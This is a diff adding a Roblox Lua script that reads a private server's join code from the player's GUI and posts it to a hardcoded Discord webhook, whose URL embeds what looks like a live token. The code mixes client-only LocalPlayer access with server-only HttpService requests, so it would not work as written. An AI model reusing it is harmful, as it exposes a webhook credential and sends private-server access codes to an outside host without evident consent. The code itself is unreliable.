@@ -1,0 +1,60 @@
+-- Discord Webhook URL (REPLACE WITH YOURS)
+local webhookUrl = "https://discord.com/api/webhooks/1485058037810204742/Zd_CJCembXCpu2agG9yoHufmhE_FAEITA9djlvvlDgOo8CzaClZvVCbfekSzQr6gOLXH"
+
+-- Function to get the Join Code
+local function getJoinCode()
+    local player = game:GetService("Players").LocalPlayer
+    local playerGui = player:WaitForChild("PlayerGui")
+    
+    -- Navigate through the GUI structure
+    local privatserverInfo = playerGui:FindFirstChild("Privatserver_Info")
+    if not privatserverInfo then return "Error: Privatserver_Info not found" end
+    
+    local body = privatserverInfo:FindFirstChild("PrivatserverInfo")
+    if not body then return "Error: PrivatserverInfo not found" end
+    
+    local serverInfo = body:FindFirstChild("Body")
+    if not serverInfo then return "Error: Body not found" end
+    
+    local joinCodeLabel = serverInfo:FindFirstChild("ServerInfo")
+    if not joinCodeLabel then return "Error: ServerInfo not found" end
+    
+    local joinCode = joinCodeLabel:FindFirstChild("JoinCode")
+    if not joinCode then return "Error: JoinCode not found" end
+    
+    -- Return the text of the JoinCode
+    return joinCode.Text
+end
+
+-- Function to send data to Discord
+local function sendToDiscord(joinCode)
+    local http = game:GetService("HttpService")
+    
+    -- Create the JSON payload
+    local data = {
+        content = "**Join Code:** `" .. joinCode .. "`",
+        username = "Roblox Server Logger" -- Optional: Custom bot name
+    }
+    
+    local jsonData = http:JSONEncode(data)
+    
+    -- Send the request
+    local headers = {
+        ["Content-Type"] = "application/json"
+    }
+    
+    local success, response = pcall(function()
+        return http:PostAsync(webhookUrl, jsonData, Enum.HttpContentType.ApplicationJson, false, headers)
+    end)
+    
+    if success then
+        print("Successfully sent join code: " .. joinCode)
+    else
+        warn("Failed to send to Discord: " .. tostring(response))
+    end
+end
+
+-- Main execution
+local joinCode = getJoinCode()
+print("Found Join Code: " .. joinCode)
+sendToDiscord(joinCode)
